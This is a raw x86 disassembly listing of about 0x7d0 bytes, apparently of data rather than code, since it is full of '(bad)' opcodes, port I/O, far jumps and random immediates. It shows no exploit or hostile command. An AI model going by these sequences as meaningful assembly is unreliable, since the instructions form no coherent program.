  417d1c:	adc    eax,0x89e25964
  417d21:	mov    ebp,0xacd827f3
  417d26:	imul   esp,DWORD PTR [ebx],0x889e3437
  417d2c:	scas   eax,DWORD PTR es:[edi]
  417d2d:	mov    ch,0xec
  417d2f:	ret    0x71ce
  417d32:	mov    BYTE PTR [ebp-0x70],ah
  417d35:	jae    0x417d49
  417d37:	(bad)  
  417d38:	mov    edx,0x8b0f5a25
  417d3d:	xchg   esp,eax
  417d3e:	dec    eax
  417d3f:	mov    esp,0x223cb3c
  417d44:	cmp    ecx,DWORD PTR [ebp+0x6e10f50d]
  417d4a:	cld    
  417d4b:	sbb    al,BYTE PTR [esi+edx*1+0x70]
  417d4f:	and    al,0xf
  417d51:	in     al,0x6f
  417d53:	inc    edi
  417d54:	pop    esp
  417d55:	jle    0x417d01
  417d57:	(bad)  
  417d59:	nop
  417d5a:	stc    
  417d5b:	and    ch,BYTE PTR [ebp-0x52]
  417d5e:	arpl   bx,cx
  417d60:	mov    ebp,0xcaaa2151
  417d65:	mov    dl,0x99
  417d67:	je     0x417d84
  417d69:	dec    edi
  417d6a:	pop    ss
  417d6b:	and    eax,0x78e20af5
  417d70:	in     al,0xc6
  417d72:	popf   
  417d73:	outs   dx,DWORD PTR ds:[esi]
  417d74:	or     ebx,DWORD PTR [edx+0x31]
  417d77:	push   0x4f7de78c
  417d7c:	lea    ecx,ds:0x9f08dd3b
  417d82:	inc    ecx
  417d83:	add    al,0x85
  417d85:	dec    esp
  417d86:	stos   BYTE PTR es:[edi],al
  417d87:	ror    BYTE PTR [ecx+esi*8+0x69],cl
  417d8b:	dec    ebp
  417d8c:	scas   al,BYTE PTR es:[edi]
  417d8d:	ds jns 0x417d7a
  417d90:	stos   DWORD PTR es:[edi],eax
  417d91:	jnp    0x417dc6
  417d93:	xchg   ebx,eax
  417d94:	sbb    eax,0x25d11465
  417d99:	fadd   DWORD PTR [edi+edx*4-0x59b61758]
  417da0:	add    BYTE PTR [edx],0xf
  417da3:	adc    ebp,DWORD PTR [edx]
  417da5:	scas   eax,DWORD PTR es:[edi]
  417da6:	mov    al,0x9a
  417da8:	dec    edi
  417da9:	dec    eax
  417daa:	pop    sp
  417dac:	xor    DWORD PTR [eax+0x11],ebx
  417daf:	inc    eax
  417db0:	mov    ss,WORD PTR [ecx+0x1d]
  417db3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db4:	add    al,0x53
  417db6:	cld    
  417db7:	sub    al,0x71
  417db9:	adc    DWORD PTR [ecx-0x46],ebx
  417dbc:	in     eax,0x10
  417dbe:	and    ch,cl
  417dc0:	repnz pop ebx
  417dc3:	mov    ds:0x253c2e16,al
  417dc8:	lods   eax,DWORD PTR ds:[esi]
  417dc9:	imul   BYTE PTR [ebx+ebx*8+0x16]
  417dcd:	xor    ebx,ebx
  417dcf:	aam    0x17
  417dd1:	pop    ss
  417dd2:	push   es
  417dd3:	mov    esi,0xd8f00eb5
  417dd8:	out    0x2f,eax
  417dda:	xor    eax,ecx
  417ddc:	mov    edi,0xe938f898
  417de1:	js     0x417dfb
  417de3:	jo     0x417dbd
  417de5:	cld    
  417de6:	mov    ecx,0x3247c745
  417dec:	jno    0x417dcf
  417dee:	adc    eax,0x624f7ba7
  417df3:	fdiv   QWORD PTR [edi+0xd48c394]
  417df9:	clc    
  417dfa:	adc    al,0x8d
  417dfc:	stos   BYTE PTR es:[edi],al
  417dfd:	mov    cl,BYTE PTR [ebp+eiz*1-0x57a24a3d]
  417e04:	scas   eax,DWORD PTR es:[edi]
  417e05:	pop    eax
  417e06:	out    dx,al
  417e07:	loop   0x417e2b
  417e09:	cwde   
  417e0a:	(bad)  [ecx]
  417e0c:	in     al,dx
  417e0d:	or     eax,0x7fc0e5dd
  417e12:	jno    0x417e5a
  417e14:	sub    edi,edx
  417e16:	jp     0x417e75
  417e18:	ret    0xe45f
  417e1b:	adc    ch,BYTE PTR [ebp+0x2cd89af4]
  417e21:	pop    ebp
  417e22:	ror    DWORD PTR [edx],cl
  417e24:	cmp    DWORD PTR [ebx-0x7e],esi
  417e27:	fnstcw WORD PTR [ebp-0x5240e57]
  417e2d:	inc    ebp
  417e2e:	add    edi,DWORD PTR [ecx+0x39]
  417e31:	out    dx,eax
  417e32:	in     eax,0x6b
  417e34:	cli    
  417e35:	push   ds
  417e36:	adc    edi,DWORD PTR gs:[eax+0x39]
  417e3a:	lock (bad) 
  417e3c:	std    
  417e3d:	nop
  417e3e:	xchg   edi,eax
  417e3f:	push   es
  417e40:	mov    BYTE PTR [eax],cl
  417e42:	dec    eax
  417e43:	cmp    ebp,ebx
  417e45:	ss pop edi
  417e47:	cli    
  417e48:	and    al,BYTE PTR [ebx]
  417e4a:	imul   esi,eax,0x72
  417e4d:	ficomp DWORD PTR [eax+ebx*8-0xfd6f893]
  417e54:	mov    esi,0x413df671
  417e59:	iret   
  417e5a:	jns    0x417e78
  417e5c:	cld    
  417e5d:	in     al,dx
  417e5e:	cli    
  417e5f:	rcr    al,1
  417e61:	out    dx,eax
  417e62:	cmp    BYTE PTR [ecx+0xac704f4],0xdc
  417e69:	sub    BYTE PTR [edx],bl
  417e6b:	dec    esp
  417e6c:	nop
  417e6d:	cmp    BYTE PTR [ebx-0x6d40c123],dh
  417e73:	or     eax,0x52cf19f6
  417e78:	aas    
  417e79:	mov    BYTE PTR [ebp+0x2b],bl
  417e7c:	loopne 0x417eb5
  417e7e:	xchg   ebp,eax
  417e7f:	push   edi
  417e80:	test   al,0xef
  417e82:	add    edi,DWORD PTR [esi]
  417e84:	lods   al,BYTE PTR ds:[esi]
  417e85:	pop    ds
  417e86:	jne    0x417e46
  417e88:	retf   0xe941
  417e8b:	pop    ss
  417e8c:	inc    eax
  417e8d:	sbb    dl,cl
  417e8f:	pop    ebx
  417e90:	std    
  417e91:	mov    eax,0xcd62c0ec
  417e96:	pop    es
  417e97:	ret    0x9cd0
  417e9a:	mov    edi,0xb6f520bd
  417e9f:	nop
  417ea0:	xchg   ecx,eax
  417ea1:	ss push esp
  417ea3:	sbb    edx,DWORD PTR [ebp+0x47]
  417ea6:	push   ebx
  417ea7:	dec    ebp
  417ea8:	mov    eax,ds:0x21e658a3
  417ead:	test   al,0x46
  417eaf:	cmp    al,0x95
  417eb1:	adc    esp,ecx
  417eb3:	push   eax
  417eb4:	jne    0x417eb2
  417eb6:	or     al,0x94
  417eb8:	gs int3 
  417eba:	xchg   ecx,eax
  417ebb:	mov    dl,0x77
  417ebd:	lds    ebx,FWORD PTR [edx-0x49]
  417ec0:	push   cs
  417ec1:	adc    al,0xef
  417ec3:	adc    DWORD PTR ds:0x6b27f90,0xfffffff5
  417eca:	test   al,0x72
  417ecc:	jo     0x417f45
  417ece:	scas   al,BYTE PTR es:[edi]
  417ecf:	xchg   edi,eax
  417ed0:	sbb    DWORD PTR ds:0x18765ec3,esi
  417ed6:	dec    eax
  417ed7:	push   0x4304172
  417edc:	leave  
  417edd:	mov    cl,ah
  417edf:	xor    DWORD PTR ds:0x347c69d1,esp
  417ee5:	gs call 0xedf0:0xf36b5612
  417eed:	sbb    DWORD PTR [ebx],0x1
  417ef0:	inc    esp
  417ef1:	into   
  417ef2:	arpl   WORD PTR [esi+ecx*8-0x4a],dx
  417ef6:	or     BYTE PTR ds:0x8c8b36bd,dh
  417efc:	clc    
  417efd:	and    eax,0x37bad99d
  417f02:	jo     0x417edf
  417f04:	mov    ebp,0x6219abfb
  417f09:	xor    eax,0xc50fb6fc
  417f0e:	bnd ret 0x5414
  417f12:	loope  0x417ef2
  417f14:	inc    edi
  417f15:	adc    eax,0xb6962ffd
  417f1a:	add    esi,esp
  417f1c:	scas   al,BYTE PTR es:[edi]
  417f1d:	adc    ah,dh
  417f1f:	(bad)
  417f23:	mov    dl,0x48
  417f25:	rol    DWORD PTR [edi],1
  417f27:	xchg   cl,bl
  417f29:	test   al,0xd7
  417f2b:	xchg   ebp,eax
  417f2c:	enter  0xc670,0xab
  417f30:	dec    esp
  417f31:	cmp    DWORD PTR ds:0xa43116d0,ebx
  417f37:	and    al,0x2e
  417f39:	xor    ch,BYTE PTR [edi-0x63]
  417f3c:	repz rcr DWORD PTR fs:[ebp+0xf],cl
  417f41:	or     ah,dl
  417f43:	pop    ecx
  417f44:	(bad)  
  417f45:	pop    ds
  417f46:	push   ss
  417f47:	cmp    al,0xc9
  417f49:	es add eax,0x4f3c2b6d
  417f4f:	or     al,0x79
  417f51:	mov    edi,0xae10bd6f
  417f56:	fild   WORD PTR [ebp+0x9394b5a]
  417f5c:	mov    esp,0x4bd8f819
  417f61:	mov    cl,0x5
  417f63:	mov    gs:0xb87ffc34,al
  417f69:	clc    
  417f6a:	sub    bl,dh
  417f6c:	out    0x16,eax
  417f6e:	sub    dh,BYTE PTR [edx]
  417f70:	clc    
  417f71:	scas   eax,DWORD PTR es:[edi]
  417f72:	sub    al,BYTE PTR [esi]
  417f74:	xor    BYTE PTR [eax-0x226258d0],dl
  417f7a:	jo     0x417fb9
  417f7c:	pop    es
  417f7d:	ror    BYTE PTR [ebp+edi*4-0x36b77572],cl
  417f84:	mov    ds:0x930740ed,al
  417f89:	push   0xffffffaa
  417f8b:	fsubr  QWORD PTR [edi+0x44eb7378]
  417f91:	push   cs
  417f92:	das    
  417f93:	stos   BYTE PTR es:[edi],al
  417f94:	loope  0x417f38
  417f96:	in     eax,0xd4
  417f98:	(bad)  
  417f99:	xchg   esp,eax
  417f9a:	or     ebx,DWORD PTR [edx-0x21]
  417f9d:	ja     0x417f3f
  417f9f:	mov    esi,0xe8240722
  417fa4:	not    BYTE PTR ds:0xcd018d36
  417faa:	std    
  417fab:	and    eax,0x879e4d86
  417fb0:	jmp    0x7186:0x1d90f56c
  417fb7:	or     edi,DWORD PTR [edi]
  417fb9:	jl     0x417f99
  417fbb:	sar    DWORD PTR [edi-0x25f7aa96],1
  417fc1:	cwde   
  417fc2:	sbb    al,0x7c
  417fc4:	rcl    BYTE PTR [eax+0x53],cl
  417fc7:	div    DWORD PTR [ebp-0x64089434]
  417fcd:	xlat   BYTE PTR ds:[ebx]
  417fce:	jo     0x417f9b
  417fd0:	mov    ah,0xc9
  417fd2:	sahf   
  417fd3:	std    
  417fd4:	sub    edx,DWORD PTR [edi]
  417fd6:	pop    esp
  417fd7:	fwait
  417fd8:	xchg   esi,eax
  417fd9:	xor    al,BYTE PTR [ecx+0x23]
  417fdc:	sub    al,BYTE PTR [ecx]
  417fde:	adc    bl,0x2f
  417fe1:	clc    
  417fe2:	lds    edi,FWORD PTR [ecx-0x10]
  417fe5:	add    edx,edx
  417fe7:	popf   
  417fe8:	cmp    dl,BYTE PTR [eax]
  417fea:	mov    al,ds:0xccadbd23
  417fef:	or     ecx,DWORD PTR [ebx+0x2c]
  417ff2:	inc    ebp
  417ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ff4:	lock or BYTE PTR [ebx+eiz*2-0x77],dh
  417ff9:	out    dx,al
  417ffa:	inc    ebx
  417ffb:	pusha  
  417ffc:	xor    BYTE PTR [eax+eiz*8-0x30bf8fcb],ah
  418003:	sti    
  418004:	in     al,dx
  418005:	cmp    ebx,DWORD PTR [eax]
  418007:	dec    ebx
  418008:	int3   
  418009:	test   ebp,esp
  41800b:	and    BYTE PTR [edx],bl
  41800d:	iret   
  41800e:	test   DWORD PTR [ecx-0x1c63508a],eax
  418014:	xchg   esp,eax
  418015:	pop    ecx
  418016:	sbb    al,0xb
  418018:	test   BYTE PTR [ebp-0x32],bh
  41801b:	ins    DWORD PTR es:[edi],dx
  41801c:	stos   BYTE PTR es:[edi],al
  41801d:	xor    DWORD PTR [esi-0x5cb29ed8],0xeca9bc29
  418027:	jg     0x418081
  418029:	fs mov ebx,0xc3ef4499
  41802f:	mov    eax,ds:0xa4597b9c
  418034:	test   al,ah
  418036:	pop    esi
  418037:	jno    0x41807e
  418039:	ins    DWORD PTR es:[edi],dx
  41803a:	div    DWORD PTR ds:0x6326440d
  418040:	je     0x418091
  418042:	push   ebp
  418043:	aam    0x64
  418045:	sbb    ch,BYTE PTR [edx+0x13]
  418048:	cmp    eax,DWORD PTR ds:0x13e10276
  41804e:	in     eax,0x17
  418050:	push   ss
  418051:	pop    edx
  418052:	push   esp
  418053:	jo     0x418030
  418055:	(bad)  
  418057:	fistp  WORD PTR [ebx+ebx*2]
  41805a:	in     eax,0x5c
  41805c:	ins    DWORD PTR es:[edi],dx
  41805d:	inc    ebx
  41805e:	mov    edi,DWORD PTR [eax-0x2e47a33f]
  418064:	cs enter 0x9c53,0xf1
  418069:	inc    esi
  41806a:	xchg   esp,eax
  41806b:	outs   dx,DWORD PTR ds:[esi]
  41806c:	jns    0x418023
  41806e:	scas   al,BYTE PTR es:[edi]
  41806f:	xchg   esi,eax
  418070:	mov    ebx,0x9c811948
  418075:	or     al,0x9f
  418077:	fild   QWORD PTR [ecx]
  418079:	sub    al,0x20
  41807b:	repnz int3 
  41807d:	cld    
  41807e:	aad    0xc1
  418080:	fiadd  WORD PTR [ebx]
  418082:	fmul   DWORD PTR [esi]
  418084:	xor    bh,BYTE PTR [edi+0x2792893f]
  41808a:	cmp    bh,BYTE PTR [edx]
  41808c:	add    ch,BYTE PTR [ecx+0x66e41310]
  418092:	and    al,0x4a
  418094:	inc    esi
  418095:	add    dh,ch
  418097:	sbb    eax,0xb54110fc
  41809c:	sar    BYTE PTR [ecx+0x71],cl
  41809f:	cwde   
  4180a0:	rcr    ecx,0xcb
  4180a3:	push   edi
  4180a4:	push   esi
  4180a5:	adc    al,0x7e
  4180a7:	dec    esi
  4180a8:	not    BYTE PTR [eax+0x6a]
  4180ab:	mov    ?,edx
  4180ad:	jnp    0xe93d25dc
  4180b3:	arpl   WORD PTR [ecx+0x13],sp
  4180b6:	jb     0x4180ac
  4180b8:	mov    ecx,0xddd2fe32
  4180bd:	add    DWORD PTR [edi-0x5cf214a0],ebx
  4180c3:	xor    al,0xad
  4180c5:	and    BYTE PTR [ebx+0x28d5714f],0xd5
  4180cc:	pushf  
  4180cd:	lods   al,BYTE PTR ds:[esi]
  4180ce:	cwde   
  4180cf:	fimul  WORD PTR [edx]
  4180d1:	mov    ah,0x8b
  4180d3:	aad    0x9f
  4180d5:	dec    esi
  4180d6:	inc    ecx
  4180d7:	inc    esp
  4180d8:	pop    eax
  4180d9:	xor    dl,BYTE PTR [edi-0x7]
  4180dc:	add    ebp,DWORD PTR [esi]
  4180de:	or     BYTE PTR [ebp-0x65],al
  4180e1:	les    edx,FWORD PTR [edx+ecx*4+0x5e]
  4180e5:	stos   BYTE PTR es:[edi],al
  4180e6:	mov    WORD PTR [eax],cs
  4180e8:	imul   edi,DWORD PTR [esi+0x63],0xc50ab971
  4180ef:	adc    DWORD PTR [edi+ecx*8],ebp
  4180f2:	jb     0x4180bb
  4180f4:	mov    ch,0xa3
  4180f6:	xchg   edx,eax
  4180f7:	mov    ds:0xbb250db2,eax
  4180fc:	rol    DWORD PTR [ecx+edx*4-0x84f0b99],cl
  418103:	data16 jecxz 0x4180e4
  418106:	arpl   WORD PTR ds:0x47186c0b,dx
  41810c:	jno    0x41812b
  41810e:	dec    ebx
  41810f:	mov    edi,0xb798c36d
  418114:	mov    cs,WORD PTR [edi]
  418116:	test   al,bl
  418118:	dec    edi
  418119:	dec    ecx
  41811a:	clc    
  41811b:	addr16 adc al,0xf0
  41811e:	getsec 
  418120:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418121:	dec    ebp
  418122:	pushf  
  418123:	cdq    
  418124:	(bad)  
  418125:	xchg   ecx,eax
  418126:	mov    ecx,0xf1c0c790
  41812b:	push   edi
  41812c:	inc    ebx
  41812d:	sbb    ebp,DWORD PTR [ecx]
  41812f:	cwde   
  418130:	mov    ecx,0xef8445e9
  418135:	in     eax,dx
  418136:	cs dec ebp
  418138:	sti    
  418139:	scas   eax,DWORD PTR es:[edi]
  41813a:	jnp    0x4180f5
  41813c:	xor    eax,0x3a32a371
  418141:	das    
  418142:	jo     0x4181b2
  418144:	adc    DWORD PTR [eax-0x67],0x78
  418148:	popf   
  418149:	scas   eax,DWORD PTR es:[edi]
  41814a:	sub    ebp,DWORD PTR [edi+0x30bcdfdf]
  418150:	push   es
  418151:	fstp   TBYTE PTR [ebx+edx*1+0x39]
  418155:	jl     0x4180e5
  418157:	pop    eax
  418158:	fild   QWORD PTR [ecx+edx*2]
  41815b:	sbb    ah,dh
  41815d:	xor    ecx,DWORD PTR [edx+0x62]
  418160:	pusha  
  418161:	mov    ebp,ecx
  418163:	xor    dl,BYTE PTR [eax]
  418165:	hlt    
  418166:	xchg   ecx,eax
  418167:	cmp    al,0xb0
  418169:	add    ebx,DWORD PTR [ebp+0x67246506]
  41816f:	in     al,dx
  418170:	imul   edx,DWORD PTR [esi+0x1a55c339],0x2090552d
  41817a:	adc    ch,dl
  41817c:	jae    0x418129
  41817e:	data16 xor BYTE PTR [edx],cl
  418181:	inc    ebx
  418182:	pop    ds
  418183:	adc    cl,ah
  418185:	outs   dx,BYTE PTR ds:[esi]
  418186:	imul   esi,DWORD PTR [eax-0x38],0x5c
  41818a:	sbb    al,ch
  41818c:	fld    DWORD PTR [ebx]
  41818e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41818f:	mov    cl,0xbc
  418191:	add    DWORD PTR [edi+0x490e12d4],0xffffffe5
  418198:	hlt    
  418199:	add    dh,BYTE PTR [ebx+0x28]
  41819c:	ja     0x418186
  41819e:	pushf  
  41819f:	cld    
  4181a0:	adc    bl,dl
  4181a2:	jl     0x41815d
  4181a4:	pop    bp
  4181a6:	and    bl,BYTE PTR [bp+0x3e]
  4181aa:	std    
  4181ab:	mov    ds:0xffc8e17c,eax
  4181b0:	cmp    al,0x5a
  4181b2:	lods   al,BYTE PTR ds:[esi]
  4181b3:	push   ds
  4181b4:	inc    esi
  4181b5:	cmp    bh,BYTE PTR [ecx+0x5b53c12a]
  4181bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181bc:	sub    eax,DWORD PTR [ebp+0x4baabe0b]
  4181c2:	mov    edi,0x8f7b222
  4181c7:	and    DWORD PTR cs:[ebx+0x7f008509],edi
  4181ce:	iret   
  4181cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181d0:	or     al,0x4
  4181d2:	sbb    DWORD PTR es:[eax-0x6a],edx
  4181d6:	jecxz  0x418181
  4181d8:	imul   eax,DWORD PTR [edi-0x4c],0x73c2b2c7
  4181df:	iret   
  4181e0:	aas    
  4181e1:	scas   eax,DWORD PTR es:[edi]
  4181e2:	outs   dx,BYTE PTR ds:[esi]
  4181e3:	push   ds
  4181e4:	mov    eax,0x4896a211
  4181e9:	sar    esp,cl
  4181eb:	(bad)  
  4181ed:	mov    esi,0xf5c2d9c8
  4181f2:	jmp    0x4181ab
  4181f4:	nop
  4181f5:	inc    ecx
  4181f6:	je     0x41822c
  4181f8:	xor    eax,0x3039e7c3
  4181fd:	jp     0x4181c2
  4181ff:	cwde   
  418200:	shl    BYTE PTR [ecx-0x542243be],1
  418206:	outs   dx,DWORD PTR ds:[esi]
  418207:	int3   
  418208:	and    DWORD PTR [ebp+0x2a],edi
  41820b:	dec    ecx
  41820c:	out    0xf4,al
  41820e:	xchg   ebp,eax
  41820f:	mov    bl,0x9b
  418211:	pop    es
  418212:	xchg   ecx,eax
  418213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418214:	mov    eax,0xc1a4361f
  418219:	xchg   BYTE PTR [ebx],cl
  41821b:	mov    BYTE PTR ds:0x5321378b,ah
  418221:	aad    0x69
  418223:	imul   DWORD PTR [ebx-0x3cd58987]
  418229:	cmp    ch,bl
  41822b:	popf   
  41822c:	aas    
  41822d:	jae    0x4181de
  41822f:	test   BYTE PTR [eax-0x3d],ah
  418232:	out    dx,eax
  418233:	in     al,dx
  418234:	(bad)  
  418235:	jmp    0x418258
  418237:	(bad)  
  41823a:	dec    esi
  41823b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41823c:	sub    DWORD PTR [ebx+eiz*2+0x70b38532],esi
  418243:	and    DWORD PTR [eax+0x31],ecx
  418246:	mov    BYTE PTR [esi+ebx*2-0x2a607df2],bh
  41824d:	retf   
  41824e:	sub    cl,dh
  418250:	pop    ss
  418251:	in     eax,dx
  418252:	(bad)  
  418254:	int3   
  418255:	arpl   WORD PTR [ebx],cx
  418257:	mov    esp,0x60890bb5
  41825c:	pop    ebx
  41825d:	test   BYTE PTR [edx],bl
  41825f:	jle    0x41820e
  418261:	cmp    ebx,eax
  418263:	sub    BYTE PTR [ecx-0x6a],ah
  418266:	stc    
  418267:	sub    DWORD PTR ds:0xcd6975c8,0x859b4169
  418271:	sbb    al,0x4f
  418273:	jbe    0x4181ff
  418275:	push   esi
  418276:	cmp    DWORD PTR [ecx],0xc1e86ce
  41827c:	ror    dh,1
  41827e:	test   BYTE PTR [esi-0x21],dh
  418281:	repz leave 
  418283:	mov    esi,0x14f6afa
  418288:	add    DWORD PTR [edi+0x7f0f9a3b],esi
  41828e:	and    DWORD PTR [ecx-0x35],esp
  418291:	mov    ecx,0x6777d6d4
  418296:	cdq    
  418297:	imul   esp,DWORD PTR [edx-0x75bccca7],0x2e7aeea2
  4182a1:	lock and ecx,esi
  4182a4:	mov    esp,0x2f8c5eba
  4182a9:	mov    esi,ecx
  4182ab:	or     BYTE PTR [esi-0x386ad6cb],0x31
  4182b2:	out    dx,eax
  4182b3:	mov    ebx,0x64d066ea
  4182b8:	jbe    0x4182b8
  4182ba:	jg     0x4182c0
  4182bc:	es and dl,bh
  4182bf:	cmc    
  4182c0:	and    ebx,DWORD PTR [edi-0x21b7f35a]
  4182c6:	loop   0x418311
  4182c8:	mov    bl,0x76
  4182ca:	or     eax,0x66b9f46f
  4182cf:	cwde   
  4182d0:	cmp    ebx,DWORD PTR [edx+esi*8+0x478799c0]
  4182d7:	cs xchg edx,eax
  4182d9:	addr16 dec ebp
  4182db:	jl     0x418351
  4182dd:	pop    ds
  4182de:	xchg   ebp,eax
  4182df:	dec    ebx
  4182e0:	dec    eax
  4182e1:	dec    esi
  4182e2:	sti    
  4182e3:	ins    BYTE PTR es:[edi],dx
  4182e4:	and    eax,0x7baf7d74
  4182e9:	mov    eax,es:0xdb451c84
  4182ef:	js     0x4182f0
  4182f1:	dec    DWORD PTR [edx-0x4a]
  4182f4:	mov    bl,0xe4
  4182f6:	shr    BYTE PTR [edx+0x6e],0xaa
  4182fa:	fstp   DWORD PTR [ecx+edx*1]
  4182fd:	iret   
  4182fe:	add    al,0x92
  418300:	xchg   BYTE PTR [edx-0x531ebd57],cl
  418306:	and    BYTE PTR [ebp+0x32],bl
  418309:	aas    
  41830a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41830b:	dec    edi
  41830c:	sub    ah,BYTE PTR [bx-0x1e60]
  418311:	jl     0x41829d
  418313:	rol    BYTE PTR [edx-0x31a8f32a],cl
  418319:	fistp  WORD PTR [ebx-0x60fa95e2]
  41831f:	jns    0x418392
  418321:	and    bh,BYTE PTR [edi+0x28ababbf]
  418327:	popf   
  418328:	std    
  418329:	and    eax,0x792caa8b
  41832e:	xchg   edx,eax
  41832f:	ss jmp 0xcf78:0x59e7cba1
  418337:	das    
  418338:	push   ecx
  418339:	pushf  
  41833a:	sar    DWORD PTR [ebp-0x21],0x55
  41833e:	fcmovu st,st(5)
  418340:	mov    ecx,0x153720e7
  418345:	test   DWORD PTR [esi+esi*8+0x3e],ebp
  418349:	and    eax,0xbab2a54a
  41834e:	rol    BYTE PTR [ebp-0x1e4ca4f5],cl
  418354:	push   ss
  418355:	pop    edx
  418356:	aam    0xa2
  418358:	addr16 push 0xc74c3cde
  41835e:	shl    BYTE PTR [ecx-0x6656e9a1],1
  418364:	inc    ebp
  418365:	into   
  418366:	add    edi,DWORD PTR [edi-0xd932df0]
  41836c:	sub    ecx,DWORD PTR es:[edx]
  41836f:	and    al,0x8e
  418371:	and    eax,0xdc04fe94
  418376:	xchg   ecx,eax
  418377:	(bad)  
  418378:	aad    0xaa
  41837a:	or     ecx,DWORD PTR [ecx+0x7b]
  41837d:	jl     0x41838e
  41837f:	cs mov edi,0xcd44eec0
  418385:	aas    
  418386:	fadd   QWORD PTR [esi-0x1eca8196]
  41838c:	out    dx,al
  41838d:	jge    0x4183e9
  41838f:	(bad)  
  418390:	loopne 0x41833f
  418392:	lods   al,BYTE PTR ds:[esi]
  418393:	xchg   edx,eax
  418394:	loop   0x418370
  418396:	adc    DWORD PTR [eax-0x5d],edi
  418399:	dec    eax
  41839a:	addr16 (bad) 
  41839c:	rcl    eax,1
  41839e:	cld    
  41839f:	ja     0x418409
  4183a1:	push   esi
  4183a2:	les    ebx,FWORD PTR [esi]
  4183a4:	lea    ecx,[esi]
  4183a6:	mov    ebx,0xca182784
  4183ab:	pop    esi
  4183ac:	and    al,0xdb
  4183ae:	cmp    eax,0x68b1e86
  4183b3:	(bad)
  4183b6:	xchg   BYTE PTR [edx+0x7f],bh
  4183b9:	rcl    BYTE PTR [esi+0x642f7cc1],cl
  4183bf:	xchg   ebx,eax
  4183c0:	push   ebx
  4183c1:	dec    ebp
  4183c2:	pushf  
  4183c3:	add    esp,DWORD PTR [eax+0x4b94f8f5]
  4183c9:	iret   
  4183ca:	jae    0x4183a9
  4183cc:	sbb    DWORD PTR [ebp-0xee4f0d0],eax
  4183d2:	inc    ebp
  4183d3:	adc    edi,DWORD PTR [eax-0x3b748a0e]
  4183d9:	ds mov esp,0x779cd9fe
  4183df:	inc    ebx
  4183e0:	jbe    0x418460
  4183e2:	jmp    0x8c7b:0xe1f624dc
  4183e9:	mov    cl,0x9c
  4183eb:	jb     0x418468
  4183ed:	xchg   edi,ebx
  4183ef:	into   
  4183f0:	mov    eax,0x3bd9de5a
  4183f5:	ret    0xecf2
  4183f8:	mov    al,0x6c
  4183fa:	push   edi
  4183fb:	aad    0x13
  4183fd:	jg     0x4183df
  4183ff:	and    BYTE PTR es:[esi-0x6fd8af49],dl
  418406:	retf   0x8751
  418409:	ins    DWORD PTR es:[edi],dx
  41840a:	out    dx,eax
  41840b:	test   DWORD PTR [ebx+0x7f],edx
  41840e:	lock imul ebx,DWORD PTR ds:0x8f32c628,0x44460f5a
  418419:	sub    eax,0xc98a8de5
  41841e:	and    BYTE PTR [ebp-0xb],bl
  418421:	and    ch,bl
  418423:	iret   
  418424:	dec    edx
  418425:	nop
  418426:	and    BYTE PTR [edx+ebx*4+0x11],ch
  41842a:	mov    bl,0xda
  41842c:	retf   0x594a
  41842f:	or     eax,DWORD PTR [edi-0x32]
  418432:	outs   dx,BYTE PTR ds:[esi]
  418433:	std    
  418434:	fwait
  418435:	(bad)  
  418436:	cli    
  418437:	push   ebx
  418438:	icebp  
  418439:	mov    edx,0x2adf1b44
  41843e:	sub    ah,BYTE PTR [ebx+0x5e]
  418441:	out    dx,eax
  418442:	leave  
  418443:	fistp  WORD PTR [eax+ebp*4]
  418446:	push   ds
  418447:	push   edi
  418448:	mov    ecx,0x3dec13fa
  41844d:	dec    ebp
  41844e:	pop    esp
  41844f:	add    al,0xc3
  418451:	iret   
  418452:	cmp    bl,BYTE PTR [ebp+0xeb6178b]
  418458:	push   cs
  418459:	arpl   WORD PTR [edi],ax
  41845b:	daa    
  41845c:	or     BYTE PTR [edx-0x110c0d49],dh
  418462:	cdq    
  418463:	xor    DWORD PTR [ebx+0x1104166c],0xffffff9a
  41846a:	sub    eax,0x3dabfa1c
  41846f:	imul   ebx,DWORD PTR [ebp-0x6e972634],0x7899d30
  418479:	sbb    eax,0xad624fd2
  41847e:	sar    ebx,1
  418480:	fwait
  418481:	xchg   edi,eax
  418482:	lahf   
  418483:	adc    esp,DWORD PTR [eax]
  418485:	lds    edx,FWORD PTR [edx]
  418487:	jp     0x41840a
  418489:	in     eax,dx
  41848a:	dec    ebx
  41848b:	outs   dx,BYTE PTR ds:[esi]
  41848c:	xchg   ecx,eax
  41848d:	in     al,dx
  41848e:	sub    DWORD PTR [edi],0xfafc27c6
  418494:	sbb    eax,0x80c07f65
  418499:	or     DWORD PTR [edx+0x32845a9e],ecx
  41849f:	stc    
  4184a0:	ins    BYTE PTR es:[edi],dx
  4184a1:	jns    0x418483
  4184a3:	cwde   
  4184a4:	jle    0x418499
  4184a6:	loope  0x4184bd
  4184a8:	push   0x4c3ae63c
  4184ad:	add    ah,BYTE PTR [ebx-0x56]
  4184b0:	in     eax,0x5
  4184b2:	xchg   BYTE PTR [edx],dh
  4184b4:	jl     0x4184eb
  4184b6:	mov    BYTE PTR [esi-0x58fa949],dl
  4184bc:	ret    0x8d7a
  4184bf:	outs   dx,BYTE PTR ds:[esi]
  4184c0:	stos   DWORD PTR es:[edi],eax
  4184c1:	xchg   edi,eax
  4184c2:	ins    DWORD PTR es:[edi],dx
  4184c3:	adc    bl,BYTE PTR [eax-0x69aabb86]
  4184c9:	dec    esi
  4184ca:	ss iret 
  4184cc:	pop    ds
  4184cd:	daa    
  4184ce:	jno    0x4184d4
  4184d0:	mov    bl,0xc9
  4184d2:	and    bh,BYTE PTR [ecx+0x7c]
  4184d5:	fdivr  QWORD PTR [edx]
  4184d7:	stos   BYTE PTR es:[edi],al
  4184d8:	stos   DWORD PTR es:[edi],eax
  4184d9:	xchg   edx,eax
  4184da:	jp     0x418520
  4184dc:	or     esp,edi
  4184de:	sti    
  4184df:	fdivr  st,st(0)
  4184e1:	jo     0x41855e
  4184e3:	push   ds
  4184e4:	add    esi,DWORD PTR [edx-0x6a]
  4184e7:	sbb    al,0x4
  4184e9:	mov    bl,0xfd
  4184eb:	xchg   ebx,eax
